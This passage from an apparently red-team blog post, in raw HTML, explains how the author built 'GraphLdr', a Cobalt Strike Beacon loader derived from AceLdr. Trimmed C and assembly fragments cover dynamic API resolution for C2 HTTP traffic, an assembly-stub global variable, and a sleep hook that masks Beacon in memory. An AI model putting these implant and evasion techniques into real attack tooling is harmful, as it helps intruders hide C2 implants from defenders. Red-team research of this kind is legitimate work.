activeGet;</span></div></div><div class=""><div><span class="enlighter-text">    BOOL            readTasking;</span></div></div><div class=""><div><span class="enlighter-text">    LONGLONG        lastTokenTime;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">char</span><span class="enlighter-text">*           metaData;</span></div></div><div class=""><div><span class="enlighter-text">    PVOID           httpGetUri;</span></div></div><div class=""><div><span class="enlighter-text">    PVOID           httpPostUri;</span></div></div><div class=""><div><span class="enlighter-text">    PVOID           httpPostCheckSizeUrl;</span></div></div><div class=""><div><span class="enlighter-text">    PVOID           httpGetHeaders;</span></div></div><div class=""><div><span class="enlighter-text">    PVOID           httpPostHeaders;</span></div></div><div class=""><div><span class="enlighter-text">    PVOID           httpGetHeadersLen;</span></div></div><div class=""><div><span class="enlighter-text">    PVOID           httpPostHeadersLen;             </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">struct MemAddrs {
    struct {
        struct
        {
            D_API( RtlAllocateHeap );
            D_API( NtWaitForSingleObject );
            HANDLE hNtdll;
            ULONG size;
        } ntdll;

        struct
        {
            D_API( InternetConnectA );
            D_API( HttpOpenRequestA );
            D_API( HttpSendRequestA );
            D_API( InternetReadFile );
            D_API( InternetCloseHandle );
            HANDLE hNet;
            ULONG size;
        } net;

        struct
        {
            D_API( GetLastError );
            D_API( SetLastError );
            D_API( QueryPerformanceCounter );
            D_API( QueryPerformanceFrequency );
            D_API( Sleep );
        } k32;

        struct
        {
            D_API ( strlen );
            D_API ( strstr );
            D_API ( strcpy );
            D_API ( strcmp );
            D_API ( isdigit );            
            D_API ( sprintf );
            D_API ( memset );
            D_API ( malloc );
            D_API ( calloc );
            D_API ( memcpy );
            D_API ( free );
            D_API ( tolower );
        } msvcrt;

        struct
        {
            D_API( MessageBoxA );
        } user32;
    } Api, *pApi;

    BOOL            graphStrike;
    HINTERNET       hInternet;
    BOOL            firstGet;
    BOOL            firstPost;
    BOOL            activeGet;
    BOOL            readTasking;
    LONGLONG        lastTokenTime;
    char*           metaData;
    PVOID           httpGetUri;
    PVOID           httpPostUri;
    PVOID           httpPostCheckSizeUrl;
    PVOID           httpGetHeaders;
    PVOID           httpPostHeaders;
    PVOID           httpGetHeadersLen;
    PVOID           httpPostHeadersLen;             
};</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">struct MemAddrs {
&nbsp;&nbsp;&nbsp;&nbsp;struct {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API( RtlAllocateHeap );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API( NtWaitForSingleObject );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HANDLE hNtdll;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG size;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} ntdll;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API( InternetConnectA );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API( HttpOpenRequestA );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API( HttpSendRequestA );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API( InternetReadFile );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API( InternetCloseHandle );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HANDLE hNet;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ULONG size;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} net;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API( GetLastError );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API( SetLastError );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API( QueryPerformanceCounter );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API( QueryPerformanceFrequency );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API( Sleep );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} k32;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API ( strlen );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API ( strstr );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API ( strcpy );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API ( strcmp );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API ( isdigit );&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API ( sprintf );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API ( memset );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API ( malloc );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API ( calloc );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API ( memcpy );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API ( free );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API ( tolower );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} msvcrt;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;struct
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;D_API( MessageBoxA );
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} user32;
&nbsp;&nbsp;&nbsp;&nbsp;} Api, *pApi;

&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;graphStrike;
    HINTERNET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hInternet;
&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;firstGet;
&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;firstPost;
&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;activeGet;
&nbsp;&nbsp;&nbsp;&nbsp;BOOL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;readTasking;
&nbsp;&nbsp;&nbsp;&nbsp;LONGLONG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lastTokenTime;
&nbsp;&nbsp;&nbsp;&nbsp;char*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;metaData;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpGetUri;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpPostUri;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpPostCheckSizeUrl;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpGetHeaders;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpPostHeaders;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpGetHeadersLen;
&nbsp;&nbsp;&nbsp;&nbsp;PVOID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httpPostHeadersLen;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
};</pre>
</div>
</div>
</div>
<p>Storing the memory address of this critical structure is where it gets interesting. In past projects I have passed the address of this struct back and forth between the Beacon and the TS, using Cobalt Strike’s Aggressor language to store and then send the address back to Beacon with a BOF whenever I need it. This strategy isn’t viable in this case (nor is it particularly elegant to begin with) because Beacon needs the address readily accessible throughout its lifecycle. A past colleague showed me how Windows <a class="cc-tgpl01" title="https://learn.microsoft.com/en-us/windows/win32/dataxchg/about-atom-tables" href="https://learn.microsoft.com/en-us/windows/win32/dataxchg/about-atom-tables" data-testid="link-with-safety" data-renderer-mark="true">Atom Tables</a> could be used to store and then later retrieve the address on demand, but this technique still leaves something to be desired in this case because the API’s to interact with Atoms still require manual resolution each and every time.</p>
</div>
<p data-renderer-start-pos="32171">The technique that eventually made it into GraphLdr is one that was new to me, and one that I only divined by looking through AceLdr’s various source files and putting some pieces together. I noticed in one of the .asm files a set of assembly instructions defined as <code class="code cc-1o5d2cw" data-renderer-mark="true">Stub</code>. It is also declared as <code class="code cc-1o5d2cw" data-renderer-mark="true">GLOBAL</code> so that it is accessible externally:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-g1">[</span><span class="enlighter-text">BITS 64</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">GLOBAL GetIp</span></div></div><div class=""><div><span class="enlighter-text">GLOBAL Stub</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">SECTION .text$C</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Stub:</span></div></div><div class=""><div><span class="enlighter-text">    dq 0</span></div></div><div class=""><div><span class="enlighter-text">    dq 0</span></div></div><div class=""><div><span class="enlighter-text">    dq 0</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div></div><div class="enlighter-raw">[BITS 64]

GLOBAL GetIp
GLOBAL Stub

[SECTION .text$C]

Stub:
    dq 0
    dq 0
    dq 0

... Trimmed for Brevity ...</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">[BITS 64]

GLOBAL GetIp
GLOBAL Stub

[SECTION .text$C]

Stub:
    dq 0
    dq 0
    dq 0

... Trimmed for Brevity ...</pre>
<p>Then in the primary header file for the project (‘include.h’), a struct <code class="code cc-1o5d2cw" data-renderer-mark="true"><span id="9cf070c8-6f7e-4514-84e1-40737da6bca1" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="9cf070c8-6f7e-4514-84e1-40737da6bca1">STUB, *PSTUB</span></code> is defined and an extern declaration is also made for the <code class="code cc-1o5d2cw" data-renderer-mark="true">Stub</code> variable. Capitalization matters in this case; the extern declaration refers to the <code class="code cc-1o5d2cw" data-renderer-mark="true">Stub</code> section of the asm, not the <code class="code cc-1o5d2cw" data-renderer-mark="true">STUB, *PSTUB</code> struct:</p>
</div>
</div>
</div>
</div>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k2">typedef</span><span class="enlighter-text"> </span><span class="enlighter-k2">struct</span><span class="enlighter-text"> </span><span class="enlighter-m0">__attribute__</span><span class="enlighter-g1">((</span><span class="enlighter-text"> packed </span><span class="enlighter-g1">))</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    ULONG_PTR Region;</span></div></div><div class=""><div><span class="enlighter-text">    ULONG_PTR Size;</span></div></div><div class=""><div><span class="enlighter-text">    HANDLE Heap;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text"> STUB, *PSTUB ;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k0">extern</span><span class="enlighter-text"> ULONG_PTR </span><span class="enlighter-m0">Stub</span><span class="enlighter-g1">(</span><span class="enlighter-text"> VOID </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div></div><div class="enlighter-raw">... Trimmed for Brevity ...

typedef struct __attribute__(( packed ))
{
    ULONG_PTR Region;
    ULONG_PTR Size;
    HANDLE Heap;
} STUB, *PSTUB ;

... Trimmed for Brevity ...

extern ULONG_PTR Stub( VOID );

... Trimmed for Brevity ...</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">... Trimmed for Brevity ...

typedef struct __attribute__(( packed ))
{
    ULONG_PTR Region;
    ULONG_PTR Size;
    HANDLE Heap;
} STUB, *PSTUB ;

... Trimmed for Brevity ...

extern ULONG_PTR Stub( VOID );

... Trimmed for Brevity ...</pre>
<p>In the primary source file (‘ace.c’), the<code class="code cc-1o5d2cw" data-renderer-mark="true"> Stub</code> variable is cast to the <code class="code cc-1o5d2cw" data-renderer-mark="true">PSTUB</code> type and populated with some data:</p>
</div>
</div>
</div>
</div>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-m0">SECTION</span><span class="enlighter-g1">(</span><span class="enlighter-text"> B </span><span class="enlighter-g1">)</span><span class="enlighter-text"> VOID </span><span class="enlighter-m0">fillStub</span><span class="enlighter-g1">(</span><span class="enlighter-text"> PVOID buffer, HANDLE heap, SIZE_T region </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    PSTUB Stub = </span><span class="enlighter-g1">(</span><span class="enlighter-text"> PSTUB </span><span class="enlighter-g1">)</span><span class="enlighter-text">buffer;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    Stub-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Region = </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> buffer </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    Stub-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Size = </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> region </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    Stub-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Heap = heap;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">SECTION( B ) VOID fillStub( PVOID buffer, HANDLE heap, SIZE_T region )
{
    PSTUB Stub = ( PSTUB )buffer;

    Stub-&gt;Region = U_PTR( buffer );
    Stub-&gt;Size = U_PTR( region );
    Stub-&gt;Heap = heap;
};</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">SECTION( B ) VOID fillStub( PVOID buffer, HANDLE heap, SIZE_T region )
{
    PSTUB Stub = ( PSTUB )buffer;

    Stub-&gt;Region = U_PTR( buffer );
    Stub-&gt;Size = U_PTR( region );
    Stub-&gt;Heap = heap;
};</pre>
<p>Later in a completely separate source file (‘delay.c’), the <code class="code cc-1o5d2cw" data-renderer-mark="true">Stub</code> variable is accessed using the OFFSET macro and its members are used to populate a local structure:</p>
</div>
</div>
</div>
</div>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-m0">SECTION</span><span class="enlighter-g1">(</span><span class="enlighter-text"> D </span><span class="enlighter-g1">)</span><span class="enlighter-text"> VOID </span><span class="enlighter-m0">Sleep_Hook</span><span class="enlighter-g1">(</span><span class="enlighter-text"> DWORD dwMilliseconds </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    API Api;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">RtlSecureZeroMemory</span><span class="enlighter-g1">(</span><span class="enlighter-text"> &amp;Api, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text"> Api </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    Api.</span><span class="enlighter-m3">CFG</span><span class="enlighter-text"> = 0;</span></div></div><div class=""><div><span class="enlighter-text">    Api.</span><span class="enlighter-m3">dwMilliseconds</span><span class="enlighter-text"> = dwMilliseconds;</span></div></div><div class=""><div><span class="enlighter-text">    Api.</span><span class="enlighter-m3">Buffer</span><span class="enlighter-text"> = </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> PSTUB </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-g1">(</span><span class="enlighter-text"> Stub </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Region </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    Api.</span><span class="enlighter-m3">Length</span><span class="enlighter-text"> = </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> PSTUB </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-g1">(</span><span class="enlighter-text"> Stub </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Size </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    ... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">SECTION( D ) VOID Sleep_Hook( DWORD dwMilliseconds )
{
    API Api;
    RtlSecureZeroMemory( &amp;Api, sizeof( Api ) );

    Api.CFG = 0;
    Api.dwMilliseconds = dwMilliseconds;
    Api.Buffer = C_PTR( ( ( PSTUB ) OFFSET( Stub ) )-&gt;Region );
    Api.Length = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )-&gt;Size );

    ... Trimmed for Brevity ...
};</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">SECTION( D ) VOID Sleep_Hook( DWORD dwMilliseconds )
{
    API Api;
    RtlSecureZeroMemory( &amp;Api, sizeof( Api ) );

    Api.CFG = 0;
    Api.dwMilliseconds = dwMilliseconds;
    Api.Buffer = C_PTR( ( ( PSTUB ) OFFSET( Stub ) )-&gt;Region );
    Api.Length = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )-&gt;Size );

    ... Trimmed for Brevity ...
};</pre>
<p>Taken in combination, this looks an awful lot like AceLdr creating a “global” variable by reserving memory in the asm file and then later populating it and referencing it throughout the code. Even though I don’t have a very good understanding of what is really happening at the compiler and binary level, I had enough pattern recognition skills to recreate this technique for my own purposes.</p>
</div>
</div>
</div>
</div>
<p data-renderer-start-pos="34425">I created an additional entry <code class="code cc-1o5d2cw" data-renderer-mark="true"><span id="07a88c1d-70d3-4777-98e4-ad9dc23c9ca3" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="07a88c1d-70d3-4777-98e4-ad9dc23c9ca3">MemAddr</span></code> within the asm file and declared it as global:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-g1">[</span><span class="enlighter-text">BITS 64</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">GLOBAL GetIp</span></div></div><div class=""><div><span class="enlighter-text">GLOBAL Stub</span></div></div><div class=""><div><span class="enlighter-text">GLOBAL MemAddr</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">SECTION .text$C</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Stub:</span></div></div><div class=""><div><span class="enlighter-text">    dq 0</span></div></div><div class=""><div><span class="enlighter-text">    dq 0</span></div></div><div class=""><div><span class="enlighter-text">    dq 0</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">MemAddr:</span></div></div><div class=""><div><span class="enlighter-text">    dq 0</span></div></div><div class=""><div><span 